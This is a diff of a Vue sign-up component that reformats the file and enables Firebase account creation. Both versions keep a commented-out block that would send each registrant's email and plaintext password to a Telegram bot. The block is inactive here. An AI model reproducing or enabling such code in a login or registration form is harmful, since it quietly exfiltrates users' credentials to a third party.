@@ -1,73 +1,72 @@
 <template>
     <transition appear name="form">
-        <div class="form-container">
-            <h2>Register</h2>
-            <input type="email" v-model="email" placeholder="Email" />
-            <input type="password" v-model="password" placeholder="Password" />
-            <input type="password" v-model="confirmPassword" placeholder="Confirm Password" />
-            <router-link to="/Market"> <button @click="signup">Register</button></router-link>
-        </div>
+      <div class="form-container">
+        <h2>Register</h2>
+        <input type="email" v-model="email" placeholder="Email" />
+        <input type="password" v-model="password" placeholder="Password" />
+        <input type="password" v-model="confirmPassword" placeholder="Confirm Password" />
+        <router-link to="/Market"><button @click="signup">Register</button></router-link>
+      </div>
     </transition>
-</template>
+  </template>
   
-<script setup>
-import { ref } from "vue";
-// import firebase from 'firebase/compat/app';
-// import 'firebase/compat/auth';
-// import 'firebase/compat/firestore';
-
-const email = ref("");
-const password = ref("");
-const confirmPassword = ref("");
-
-const signup = () => {
+  <script setup>
+  import { ref } from "vue";
+  import firebase from 'firebase/compat/app';
+  import 'firebase/compat/auth';
+  import 'firebase/compat/firestore';
+  
+  const email = ref("");
+  const password = ref("");
+  const confirmPassword = ref("");
+  
+  const signup = () => {
     if (!email.value || !password.value || !confirmPassword.value) {
-        alert("Please fill in all the fields.");
-        return;
+      alert("Please fill in all the fields.");
+      return;
     }
-
-    if (password.value !== confirmPassword.value) {
-        alert("Passwords do not match.");
-        return;
-    }
-
-    // Send data to Telegram bot (Replace with your Telegram bot token and chat_id)
-//     const botToken = "YOUR_TELEGRAM_BOT_TOKEN";
-//     const chatId = "YOUR_TELEGRAM_CHAT_ID";
-
-//     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-//         method: 'POST',
-//         headers: {
-//             'Content-Type': 'application/json',
-//         },
-//         body: JSON.stringify({
-//             chat_id: chatId,
-//             text: `New user registered:\nEmail: ${email.value}\nPassword: ${password.value}`,
-//         }),
-//     })
-//         .then((response) => response.json())
-//         .then((data) => {
-//             console.log("Message sent to Telegram bot:", data);
-//         })
-//         .catch((error) => {
-//             console.error("Error sending message to Telegram bot:", error);
-//         });
-
-//     firebase
-//         .auth()
-//         .createUserWithEmailAndPassword(email.value, password.value)
-//         .then(
-//             (user) => {
-//                 console.log(user);
-//             },
-//             (err) => {
-//                 alert(err.message);
-//             }
-//         );
-};
-</script>
   
-  <!-- Rest of the code remains unchanged -->
+    if (password.value !== confirmPassword.value) {
+      alert("Passwords do not match.");
+      return;
+    }
+  
+    // Perform the signup logic here using Firebase
+    firebase
+      .auth()
+      .createUserWithEmailAndPassword(email.value, password.value)
+      .then(
+        (user) => {
+          console.log(user);
+        },
+        (err) => {
+          alert(err.message);
+        }
+      );
+  
+    // Send data to Telegram bot (Replace with your Telegram bot token and chat_id)
+    // const botToken = "YOUR_TELEGRAM_BOT_TOKEN";
+    // const chatId = "YOUR_TELEGRAM_CHAT_ID";
+  
+    // fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    //     method: 'POST',
+    //     headers: {
+    //         'Content-Type': 'application/json',
+    //     },
+    //     body: JSON.stringify({
+    //         chat_id: chatId,
+    //         text: `New user registered:\nEmail: ${email.value}\nPassword: ${password.value}`,
+    //     }),
+    // })
+    //     .then((response) => response.json())
+    //     .then((data) => {
+    //         console.log("Message sent to Telegram bot:", data);
+    //     })
+    //     .catch((error) => {
+    //         console.error("Error sending message to Telegram bot:", error);
+    //     });
+  };
+  </script>
   
   
 <style lang="scss">
